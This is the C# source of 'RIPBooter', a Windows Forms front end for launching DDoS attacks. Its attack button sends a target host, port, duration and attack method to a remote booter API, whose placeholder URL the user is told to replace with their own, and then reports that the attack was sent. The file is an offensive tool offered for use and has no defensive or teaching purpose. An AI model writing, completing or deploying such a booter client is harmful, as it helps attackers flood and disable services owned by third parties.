using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Web;

namespace RIPBooter
{
    public partial class Booter : Form
    {
        public Booter()
        {
            InitializeComponent();
        }

        private void thirteenTextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void DDOSButton_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            //                                 ENTER YOUR API URL HERE! CHANGE FORMAT IF NEEDED! (change around host, port, time etc.)
            string targetAPI = client.DownloadString("http://apilink.com/apiphpname.php?host=" + Target.Text + "&port=" + PortBox.Text + "&time=" + TimeBox.Text + "&method=" + MethodCombo.SelectedItem); //Enjoy
            DDOSLog.ForeColor = Color.LimeGreen;
            DDOSLog.Text += "Attack sent successfully to " + Target.Text;
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/NulledVoid/C-Booter");
        }
    }
}
